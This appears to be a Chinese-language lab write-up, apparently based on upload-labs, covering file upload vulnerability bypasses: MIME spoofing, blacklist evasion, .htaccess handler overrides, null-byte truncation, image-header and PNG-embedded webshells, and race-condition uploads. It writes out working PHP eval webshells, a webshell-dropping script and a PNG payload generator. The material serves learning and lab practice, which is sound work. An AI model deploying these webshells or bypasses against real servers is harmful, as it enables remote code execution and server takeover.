# 文件上传漏洞
* 一句话木马
```a.php
   <?php @eval($_POST['a']);?>
```
# js验证
* 没啥好说的直接禁用js就行

  ![image-20240512155543568](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121555667.png)

  ![image-20240512155718049](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121557103.png)

  ![image-20240512160033723](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121600818.png)

  
# MIME
服务端MIME类型检测是通过检查http中包含的Content-Type字段中的值来判断上传文件是否合法的。
* 利用Burp抓包，将报文中的Content-Type改成允许的类型(上传a.php)
>        Content-Type: image/gif（gif图像）
>        Content-Type: image/jpg（jpg图像）
>        Content-Type: image/png（png图像）



![屏幕截图 2024-05-12 160512](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121608074.png)

![屏幕截图 2024-05-12 160627](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121608989.png)


# 黑名单
* 特殊解析后缀：
  .phtml,.php3,.php4,.php5

* .htaccess绕过：  （适用于非nts的php版本）
  上传.htaccess 文件再上传a.jpg
```
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```
.htaccess文件把jpg文件解析成php,这样就可以上传jpg类型的webshell了然后蚁剑连接。

![image-20240512170051534](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121700589.png)

![image-20240512170037675](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121700730.png)

![image-20240512165914965](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121659094.png)






* Win下xx.jpg空格和xx.jpg.两种文件是不被允许存在的，要是这样命名文件，windows系统会默认删除空格或者.

* ::$DATA:
  在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名
  例如:    "phpinfo.php::$DATA"    Windows会自动去掉末尾的::$DATA变成"phpinfo.php"

* 删除文件名末尾的点，再首尾去空，可构造：
info.php. .(点+空格+点)

* 把黑名单的后缀替换为空：考虑双写绕过

```
$file_name = str_ireplace($deny_ext,"", $file_name);
```
# 00截断
存储路径可控
* 服务器会把我们上传的文件进行重命名，使用00截断后面拼接的内容

# **二次渲染及文件头检测**

* 通常与文件包含漏洞一起出现

```
JPEG (jpg)，文件头：FF D8 FF E1
PNG (png)，文件头：89 50 4E 47
GIF (gif)，文件头：47 49 46 38
```

* 上传图片马：
 image.png   GIF89a是gif文件头

```
GIF89a
<?php @eval($_POST['a']); ?>
```

![image-20240512180540845](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121805891.png)

利用文件包含查看是否上传成功。

```
http://192.168.1.232/upload-labs-master/include.php?file=upload/3020240512175929.png
```

![image-20240512180019592](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121800650.png)

需要打开allow_url_fopen

![image-20240512174050677](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121740741.png)

*突破gatimagesize与突破exif_imagetype方法同上*

## imagecreatefromjpeg()
直接上传的话会打散图片去除末尾的一句话木马，寻找没有打算的地方去插入木马
* 制作一个gif图片马

  ![image-20240512183129357](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121831466.png)

  ![image-20240512190953363](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121909520.png)

  将上传的文件下载后用010打开，与原文件进行比较，发现一句话木马消失了。

  ![image-20240512191245977](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121912029.png)![image-20240512191253918](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121912976.png)

  找到没变的地方插入木马，再次上传

  ![image-20240512191617523](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121916610.png)

  ![image-20240512191810352](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121918436.png)

  * 成功包含

  ![image-20240512191759342](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121917451.png)

## **png格式**
  如果是png后缀的话通常是全部改变，需要用脚本生成webshell
  
```
  <?php
  $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```
# move_uploaded_file

`move_uploaded_file()`这样一个函数，它有一个特性，会`忽略`到文件末尾的`/. `及后面的内容
并且 move_uploaded_file() 函数中的 img_path 是由post参数 save_name 控制的，这就可以在 save_name 的参数上面改动。

![image-20240512201442905](C:\Users\钟雨丹\AppData\Roaming\Typora\typora-user-images\image-20240512201442905.png)

![image-20240512201613083](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122016196.png)
# 文件名数组绕过

![image-20240512202306248](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122023329.png)

* 根据源代码，检查了文件类型必须是图片，并且把文件名$file打散成数组以 “.”分割
* 这里也存在 move_uploaded_file 函数，也就是说也有忽略到文件末尾的`/. `后面内容的性质。

```
构造数组：
save_name[0]=“2.php/”
save_name[1]为空
save_name[2]=“jpg”
```

![image-20240512203122720](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122031785.png)

![image-20240512203136009](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122031069.png)

![image-20240512203157715](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122031801.png)



# 上传图片马后连接蚁剑的问题

* 如果.htaccess文件不起作用，导致蚁剑连接为空，可能是使用了nts版本的php

# 文件上传之条件竞争
>竞争原理:
1.网站允许上传任意文件，然后检测文件中若有webshell，就删除文件；若不是指定类型文件，那么就使用unlink删除文件
2.在删除之前访问上传的php文件，从而执行上传文件中的php代码

* 上传了一张图片和一句话木马，在文件路径发现只有图片

![屏幕截图 2023-08-10 192042](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121541157.png)

猜测是上传了php文件后被删除了，这里利用文件上传的条件竞争。
* 文件上传后短时间内还没被服务器删除，这时抢在服务器删除之前访问它就能够写入一句话木马。
*  webshell:

```
<?php 
fputs(fopen("shell.php", "w"), '<?php @eval($_POST["shell"]); ?>'); 
?>
```

这是上传的php文件，目的是一读取该文件就能创建并写入一句话木马。
注意：
* 一句话木马与该文件不能重名 
* 访问包的线程需要稍微大于上传包的线程。

使用bp抓包：
上传webshell并抓包

![屏幕截图 2023-08-10 193559](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121540093.png)

访问文件路径并抓包

![屏幕截图 2023-08-10 193715](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121541455.png)

以上都设置为无playload，无限期重复，前者线程数30，后者线程数50
当第二个访问包出现了200的状态吗说明成功了，这时访问上传文件的存储路径

![屏幕截图 2023-08-10 193941](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121541793.png)



![屏幕截图 2023-08-10 194009](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121541684.png)

然后蚁剑连接就行了。![屏幕截图 2023-08-10 194108](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121539238.png)